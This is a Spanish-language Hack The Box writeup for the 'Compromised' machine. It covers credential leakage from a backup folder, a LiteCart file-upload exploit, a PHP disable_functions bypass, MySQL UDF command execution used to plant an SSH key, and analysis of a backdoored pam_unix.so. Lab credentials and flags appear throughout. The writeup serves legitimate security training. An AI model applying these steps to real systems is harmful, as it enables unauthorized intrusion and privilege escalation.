---
layout      : post
title       : "Maquina Compromised - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Compromissed/banner.jpg
category    : [ hackthebox ]
tags        : [ Information leaked, bypass disable functions php, litecart exploit, tty interactive, enumeration sql, UDF, log filter, rootkit, linpeas, pamunix]
---

Hoy vamos a resolver la máquina `Compromised` de la plataforma de `hackthebox` correspondiente a una `linux` dificultad hard, la cual va a ser explotada , aprovechando información leakeada de credenciales y utilizando un exploit correspondiente a `litercart` que conjunto al crearnos una función propia en `php` que nos derive en la ejecución de comandos, despues aprovecharemos el concepto de `UDF` en mysql, para poder ejecutar una función personalisada que nos permita ganar acceso al sistema, donde obtendremos credenciales validas de un archivo log y finalmente a partir del analisis de un `rootkit` ganar tener acceso al sistema como el usuario privilegiado `rooot`.
 

Vamos a comenzar creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Compromissed
❯ ls
 Compromissed
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## Enumeración [#](#enumeracion) {#enumeracion}
 

Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.207
PING 10.10.10.207 (10.10.10.207) 56(84) bytes of data.
64 bytes from 10.10.10.207: icmp_seq=1 ttl=63 time=207 ms

--- 10.10.10.207 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 206.547/206.547/206.547/0.000 ms
```
Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de `nmap`:

### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `allPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.207 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:35 GMT
Initiating SYN Stealth Scan at 15:35
Scanning 10.10.10.207 [65535 ports]
Discovered open port 80/tcp on 10.10.10.207
Discovered open port 22/tcp on 10.10.10.207
Completed SYN Stealth Scan at 15:35, 26.53s elapsed (65535 total ports)
Nmap scan report for 10.10.10.207
Host is up, received user-set (0.13s latency).
Scanned at 2023-06-13 15:35:29 GMT for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.65 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 22 (968B)
```
Podemos ver que los puertos que se encuentran abiertos son el puerto `22 ssh` y el `80 http`.

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p22,80 10.10.10.207 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:36 GMT
Nmap scan report for 10.10.10.207
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Legitimate Rubber Ducks | Online Store
|_Requested resource was http://10.10.10.207/shop/en/
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.60 seconds
```
Visulizamos informacion interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 22     | SSH      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80   | HTTP     | Apache httpd 2.4.29 |


Seguidamente vamos a usar la herramienta `whatweb` para ver por consola el gestor de contenido de la pagina web.

```bash
❯ whatweb http://10.10.10.207
http://10.10.10.207 [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[/shop]
http://10.10.10.207/shop [301 Moved Permanently] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[http://10.10.10.207/shop/], Title[301 Moved Permanently]
http://10.10.10.207/shop/ [302 Found] Apache[2.4.29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[http://10.10.10.207/shop/en/], X-Powered-By[LiteCart]
http://10.10.10.207/shop/en/ [200 OK] Apache[2.4.29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], Email[admin@compromised.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], JQuery[3.3.1], Open-Graph-Protocol[website], PasswordField[password], Script, Title[Legitimate Rubber Ducks | Online Store], X-Powered-By[LiteCart]
```

La herramienta nos reporta bastante información la cual incluye rutas, usuaruos y dominios, vamos a proceder a abrir la web en el navegador. Vemos que el servicio corresponde a `Litecart`.

> LiteCart es una plataforma de comercio electrónico gratuita fundada por el desarrollador web sueco T. Almroth. LiteCart está inspirado en lo mejor de los mundos y lo que podría haberse hecho mejor en soluciones alternativas de comercio electrónico. 

![](/assets/images/HTB/htb-writeup-Compromissed/compro1.PNG)


## Explotación [#](#explotación) {#explotación}

Vamos a comenzar descubriendo rutas en la web, para ello primero usaremos unos de los scripts de nmap `http-enum`.

```bash
❯ nmap --script http-enum -p80 10.10.10.207 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:42 GMT
Nmap scan report for 10.10.10.207
Host is up (0.22s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /backup/: Backup folder w/ directory listing

Nmap done: 1 IP address (1 host up) scanned in 32.04 seconds
```

Descubirmos una ruta valida que dentro tiene un archivo comprimido que procederemos a traer y descomprimir en nuestra maquina.


![](/assets/images/HTB/htb-writeup-Compromissed/compro2.PNG)


Una vez lo descomprimimos en nuestra maquina, podemos ver un directorio de nombre `shop` el cual incluye a su vez varios directorios y archivos, en los cuale

```bash
❯ cd shop
❯ ls
 admin   cache   data   ext   images   includes   logs   pages   vqmod   favicon.ico   index.php  ﮧ robots.txt
```

Una vez dentro vamos a tratar de buscar credenciales, filtrando por archivos de configuración con la siguiente expresion:

```bash
❯ find . -name \*config\* | xargs cat | grep -iE "user|pass|key"
    'name' => language::translate('title_users', 'Users'),
    'default' => 'users',
      'users' => 'users.inc.php',
      'edit_user' => 'edit_user.inc.php',
    order by priority, `key`;"
      'title' => language::translate('settings_group:title_'.$group['key'], $group['name']),
      'doc' => $group['key'],
    $app_config['docs'][$group['key']] = 'settings.inc.php';
      'icon' => 'fa-user',
      'key' => 'product_modal_window',
      'key' => 'sidebar_parallax_effect',
      'key' => 'compact_category_tree',
      'key' => 'cookie_acceptance',
  define('DB_USERNAME', 'root');
  define('DB_PASSWORD', 'changethis');
  define('DB_TABLE_USERS',                             '`'. DB_DATABASE .'`.`'. DB_TABLE_PREFIX . 'users`');
 Password Encryption Salt
  define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');
```

Obtenemos unas credenciales correspondientes a la base de datos `root: changethis` que procederemos a almancenar.

Ahora podemos ver qu dentro del directorio `admin`, vemos un archivo de nombre `login.php`, validamos si existe una ruta correspondiente en la web y efectivamente existe.


![](/assets/images/HTB/htb-writeup-Compromissed/compro3.PNG)

despues al leer el archivo `login.php`, podemos ver que comentada una ruta oculta con un archivo txt.


![](/assets/images/HTB/htb-writeup-Compromissed/compro4.PNG)


Al validar la ruta obtenemos nuevas credenciales.

![](/assets/images/HTB/htb-writeup-Compromissed/compro5.PNG)


Validamos las credenciales y nos conectamos al servicio.

![](/assets/images/HTB/htb-writeup-Compromissed/compro6.PNG)


Ahora vamos a buscar si existen vulnerabilidades asociadas a `litecart` y vemos que existe un exploit en python2.


```bash
❯ searchsploit litecart
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
LiteCart 2.1.2 - Arbitrary File Upload                                                                                                               | php/webapps/45267.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Nos traemos el exploit y lo ejecutamos con los parametros especificos

```bash
❯ python2 litecart.py -t http://10.10.10.207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/D5B8I.php?c=id
```

validamos en la web el enlace generado pero vemos que no funciona, seguidamente vamos a modificar el exploit cambiando el nombre aleatorio que nis genera por uno estatico de nombre `shell.php` y ejecutaremos dentro del arhivo `phpinfo()` para ver las funciones que estan desabilitadas.


![](/assets/images/HTB/htb-writeup-Compromissed/compro7.PNG)

Volvemos a ejecutar nuevamente el exploit.

```bash
❯ python2 litecart.py -t http://10.10.10.207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/shell.php
```

Vamos al enlace generado y vemos la lista funciones desabilitadas, y vemos que que por ello nuestro exploit no funciona ya que por defecto emplea la función `system`.


![](/assets/images/HTB/htb-writeup-Compromissed/compro8.PNG)

Vemos que estamos muy limitados en cuanto a funciones, pero debemos recordar que podemos crear nuestra propia función que nos permita ejecutar comandos a nivel de sistema. Para ello existe una utilidad de la cual nos podemos apoyar.

[https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html](https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html)


Para ello primero debemos crearnos un archivo con el contenido que nos proporcionan, en este casollamere al archivo `funct.php`. Dentro lo que hace el codigo es crear una función con el nombre `pwn`, pero puedes llamar a la función como quieras y tambien define un parametro el cual establecere con `$_REQUEST['cmd]`, para que atravez de `cmd` pueda ejecutar instrucciones.

![](/assets/images/HTB/htb-writeup-Compromissed/compro9.PNG)

Ahora modificaremos el exploit `litercart`, para que nos suba el contenido de la nueva función creada `funct.php`


![](/assets/images/HTB/htb-writeup-Compromissed/compro10.PNG)


Ejecutamos el exploit, vamos al enlance y esta vez podemos ejecutar comandos.


![](/assets/images/HTB/htb-writeup-Compromissed/compro11.PNG)


Ahora si queremos mandarnos una revershell, vemos que no tenemos conexión.

![](/assets/images/HTB/htb-writeup-Compromissed/compro12.PNG)

Para simular una `tty` utilizaremos la herramienta `tty_over_http` de s4vitar.

* [https://github.com/s4vitar/ttyoverhttp](https://github.com/s4vitar/ttyoverhttp)


El uso es simple solo debemos ingresar la url de nuestra shell en la solicitud `requests`

![](/assets/images/HTB/htb-writeup-Compromissed/compro13.PNG)

De esta forma podemos movernos mas comodamente desde consola, adicionalemente vamos a otorgarnos un aconsola.

```python
❯ python3 tty_over_http.py
> whoami
> www-data
ls
> D5B8I.php
fmiracle.php
index.html
shell.php
python3 -c 'import pty;pty.spawn("/bin/bash")'
> www-data@compromised:/var/www/html/shop$
ls
> ls
admin  data  favicon.ico  includes   logs   robots.txt
cache  ext   images	 index.php  pages  vqmod
```

Recordemos que anteriormente obtuvimos credenciales de la base de datos `root:changethis`

Validamos las credenciales y procedemos a enumerar la base de datos, enumerando la base de datos, encontramos un usuario y un hash, pero no conseguimos romper el hash.

```sql
www-data@compromised:/var/www/html/shop$
 mysql -uroot -pchangethis -e "select username, password from lc_users;" ecom
< -e "select username, password from lc_users;" ecom
mysql: [Warning] Using a password on the command line interface can be insecure.
+----------+------------------------------------------------------------------+
| username | password                                                         |
+----------+------------------------------------------------------------------+
| admin    | 44c79f6669819c0185822c587597b46c98c3cff90512318cb84d8e7c190de8b4 |
+----------+------------------------------------------------------------------+
www-data@compromised:/var/www/html/shop$
```
Al seguir enumerando el sistema, vemos que existe un usuario `mysql`, el cual tiene asignada una bash.

```bash
> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
red:x:1001:1001::/home/red:/bin/false
```

Como el usuario `mysql` tiene una bash podria estar relacionado a los `UDF`, que nos permiten definir funciones especificas.

> UDF: una Función Definida por el Usuario (UDF) es un trozo de código que extiende la funcionalidad de un servidor MySQL añadiendo una nueva función que se comporta igual que una función nativa (incorporada) de MySQL, como abs() o concat().

Para poder listar estas funciones, haciendo uso de la mismas credenciales de la base de datos, podemos hacerlo ejecutando:

```sql
mysql -uroot -pchangethis -e "select * from mysql.func"
<l -uroot -pchangethis -e "select * from mysql.func"
mysql: [Warning] Using a password on the command line interface can be insecure.
+----------+-----+-------------+----------+
| name     | ret | dl          | type     |
+----------+-----+-------------+----------+
| exec_cmd |   0 | libmysql.so | function |
+----------+-----+-------------+----------+
```

vemos que existe una función definida de nombre `exec_cmd`, que al ejecutar un comando nos lo realiza exitosamente.


```sql
mysql -uroot -pchangethis -e "select exec_cmd('pwd');"
<ql -uroot -pchangethis -e "select exec_cmd('pwd');"
mysql: [Warning] Using a password on the command line interface can be insecure.
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| exec_cmd('pwd')                                                                                                                                                                                                                                                                                                     |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| /var/lib/mysql
```

No podemos entablarnos una reverse shell, pero recordemos que el puerto `22` esta abierto, asi que podriamos usar los principios basicos de claves ssh, para introducir nuestra clave publica en el directorio del usuario como `authorized_keys`

Creamos el directorio `.ssh`

```sql
mysql -uroot -pchangethis -e "select exec_cmd('mkdir /var/lib/mysql/.ssh/');"
<-e "select exec_cmd('mkdir /var/lib/mysql/.ssh/');"
mysql: [Warning] Using a password on the command line interface can be insecure.
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| exec_cmd('mkdir /var/lib/mysql/.ssh/')                                 
```
Introducimos nuestra clave privada, renombrandola como `authorized_keys`

```sql
mysql -uroot -pchangethis -e "select exec_cmd('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSSuSh/zi5KspA8ZYqWIxduahcDanjzfout7+OVdf5zD6rme/9U0gKI5qKUV+aPk2KwyRK0se06hdubAKQJ0xNciuPoOMSiN8UqbikaxxUNNq2wUBdzGEQ93gFzpHD1VJ+LHGyJJO82x/awHBT9d7m1lgqPxuIPKC/CZWMR/8CLuC649eSaoJ5HaxeMDHNNmKu511aZUxCetjVhQxRdI3unUz7h+Bg0x64v9HYC1oOcilMJAdOXNsIJLDpeDajnz/bYjVjqx1fe4ztyhneoMF1/h4xc0165Vb2YT5AezAOuY+yZlRjkKlYuuvxGulZ1P72Pc1hO/4p3/waHz53JwfrlKtGzo0Vq2H+ajXXmNKhPbv5g531F0j75DYTMXs/oQFntvcqxXQCqqBmKsY0Gf4yy3M5D/KNOW4Z8Naeauu+XFHfqd/jTzaXck24XFYfZj1VAdn7XqD30Q3QIhESWj5i3n9E7kohx5PhgU7OB5u6K4YPVXjjOQ30iwWGQcnYAeU= root@hack4u > /var/lib/mysql/.ssh/authorized_keys');"
<ot@hack4u > /var/lib/mysql/.ssh/authorized_keys');"
mysql: [Warning] Using a password on the command line interface can be insecure.
```

```bash
❯ ssh mysql@10.10.10.207
Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2
mysql@compromised:~$ whoami
mysql
```

Una vez dentro como el usuario `mysql`, vamos a buscar de manera recursiva por la palabra `sysadmin`, encontramos un archivo `lib/mysql/strace-log.dat`.

```bash
mysql@compromised:/var$ grep -ri "sysadmin" 2>/dev/null
log/cloud-init.log:2020-05-08 15:50:07,874 - __init__.py[DEBUG]: Adding user sysadmin
log/cloud-init.log:2020-05-08 15:50:07,874 - util.py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'sysadmin', '--comment', 'compromise', '--groups', 'adm,cdrom,dip,plugdev,lxd,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m']
log/cloud-init.log:2020-05-08 15:50:31,366 - cc_ssh_import_id.py[DEBUG]: User sysadmin is not configured for ssh_import_id
log/cloud-init-output.log:ci-info: no authorized SSH keys fingerprints found for user sysadmin.
log/installer/subiquity-debug.log.2150:2020-05-08 15:33:28,872 DEBUG subiquity.controllers.identity:73 IdentityController.done next_screen user_spec={'hostname': 'compromise', 'realname': 'compromise', 'username': 'sysadmin', 'password': '<REDACTED>'}
lib/dpkg/info/systemd.postinst:# runtime-dir/sysadmin-dir/other packages (e.g. rsyslog)
lib/dpkg/info/dash.postinst:		# The sysadmin wants it this way.  Who am I to argue?
lib/dpkg/info/libssl1.0.0:amd64.postinst:	# update for a security issue, but planned by the sysadmin, not
lib/dpkg/info/libssl1.1:amd64.postinst:	# update for a security issue, but planned by the sysadmin, not
lib/dpkg/info/irqbalance.postinst:    # things the local sysadmin has added to the old /etc/default/irqbalance
lib/dpkg/info/irqbalance.postinst:        # Insert a header to help sysadmin figure out why these things are here.
lib/dpkg/info/irqbalance.postinst:        # been added to the file by the local sysadmin.
lib/dpkg/status: Sudo is a program designed to allow a sysadmin to give limited root
lib/dpkg/status: You should install ltrace if you need a sysadmin tool for tracking the
lib/dpkg/status: common Linux/UNIX commands, reducing the amount of typing sysadmins
lib/dpkg/status-old: Sudo is a program designed to allow a sysadmin to give limited root
lib/dpkg/status-old: You should install ltrace if you need a sysadmin tool for tracking the
lib/dpkg/status-old: common Linux/UNIX commands, reducing the amount of typing sysadmins
lib/mysql/strace-log.dat:22102 03:10:59 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
lib/mysql/strace-log.dat:22102 03:11:00 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
lib/mysql/strace-log.dat:22102 03:11:03 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
lib/mysql/strace-log.dat:22227 03:11:09 stat("/home/sysadmin/.my.cnf", 0x7fff97cc5590) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22227 03:11:09 stat("/home/sysadmin/.mylogin.cnf", 0x7fff97cc5590) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22102 03:11:09 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
lib/mysql/strace-log.dat:22228 03:11:15 stat("/home/sysadmin/.my.cnf", 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22228 03:11:15 stat("/home/sysadmin/.mylogin.cnf", 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22102 03:11:15 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
lib/mysql/strace-log.dat:22229 03:11:18 stat("/home/sysadmin/.my.cnf", 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22229 03:11:18 stat("/home/sysadmin/.mylogin.cnf", 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)
lib/mysql/strace-log.dat:22229 03:11:18 readlink("/home/sysadmin/.mysql_history", 0x7ffcd3f0a390, 511) = -1 ENOENT (No such file or directory)
```

Leemos el archivo y filtramos por `sysadmin y password`, para tratar de encontrar credenciales en texto claro.

```bash
mysql@compromised:/var$ cat lib/mysql/strace-log.dat | grep -iE "sysadmin|password"
22102 03:10:59 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
22102 03:11:00 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
22102 03:11:03 write(2, "\33]0;sysadmin@compromised: /opt\7\33"..., 84) = 84
22102 03:11:06 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
```

Encontramos una credencial que si la validamos corresponde al usuario `sysadmin`, ahora podemos ir a su directorio personal y visualizar la primera flag `user.txt`

```bash
mysql@compromised:/var$ su sysadmin
Password: 
sysadmin@compromised:/var$ whoami
sysadmin
sysadmin@compromised:/var$ cd /home/sysadmin/
sysadmin@compromised:~$ cat user.txt 
e0915cc0811946d4d341100789b6592e
```

## Escalada de Privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}


Como la maquina se llama `compromised`, nos da una pista de que la maquina previamente ya fue comprometida, por lo tanto puedo pensar que para garantia de una escalada de privilegios se pudo dejar un `rootkit`.


> Rootkit: Un rootkit es un tipo de software malicioso diseñado para dar la capacidad de introducirse en un dispositivo y hacerse con el control del mismo. Por lo general, los rootkits afectan el software o el sistema operativo del dispositivo que infectan, pero algunos pueden actuar sobre su hardware o firmware. Los rootkits operan en segundo plano, sin dar muestras de que están activos.


Para poder detectarlo vamos a usar `linpeas.sh` del repositorio de `carlospolop`.

* [https://github.com/carlospolop/PEASS-ng/releases/tag/20230611-b11e87f7](https://github.com/carlospolop/PEASS-ng/releases/tag/20230611-b11e87f7)


Ejecutamos el `linpeas` y encontramos que `.pam_unix.so` se encuentra oculto.

![](/assets/images/HTB/htb-writeup-Compromissed/compro14.PNG)

> pam_unix.so: Este es el módulo estándar de autenticación de Unix. Utiliza llamadas estándar de las bibliotecas del sistema para recuperar y establecer la información de la cuenta, así como la autenticación. Usualmente esto se obtiene del archivo /etc/passwd y del archivo /etc/shadow también si shadow está habilitado.


Como vemos el `pam_unix` toca temas de autenticación, vamos a traernoslo a nuestro equipo y analizarlo. Para ello vamos a hacer un bae64 del archivo y decodearlo en nuestro equipo.


```bash
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ base64 -w 0 .pam_unix.so; echo
```

Una vez tengamos el archivo en nuestro equipo vamos a examinarlo con `radare2`

```bash
❯ file pam_unix.so
pam_unix.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=52d069272a0900ed4963258eab93237d38c6d1c4, with debug_info, not stripped
❯ radare2 pam_unix.so
Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
 -- Select your architecture with: 'e asm.arch=<arch>' or r2 -a from the shell
[0x000025c0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze all functions arguments/locals
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information (aanr)
[x] Integrate dwarf function information.
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x000025c0]> afl
0x000025c0    4 50   -> 40   entry0
0x00002c70   28 732  -> 681  dbg.pam_sm_acct_mgmt
0x00002f70   34 670  -> 633  dbg.pam_sm_authenticate
0x00004390   13 222  -> 210  dbg.pam_sm_close_session
0x00003210    6 116          dbg.pam_sm_setcred
0x00003750  104 2863 -> 2805 dbg.pam_sm_chauthtok
0x00004280   13 262  -> 256  dbg.pam_sm_open_session
[0x000025c0]> s dbg.pam_sm_authenticate
[0x00002f70]> pdf
```

Analizando vemos una intrucción que hace referencia a `pam_unix_auth.c`, con lo que parece ser una credencial, en dos partes similar al formato de una credencial que previamente obtuvimos `zlke~U3Env82m2-`.

![](/assets/images/HTB/htb-writeup-Compromissed/compro15.PNG)


Validamos y efectivamente la credencial corresponde al usuario `root`.

```bash
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ su root
Password: 
root@compromised:/lib/x86_64-linux-gnu/security# whoami
root
```

Lo que nos queda por hacer es dirigirnos al directorio personal del usuario `root` y visualizar la segunda flag `root.txt`.

```bash
root@compromised:/lib/x86_64-linux-gnu/security# cd /root/
root@compromised:~# cat root.txt 
e62293eadbdb5c168b024782d6943394
```
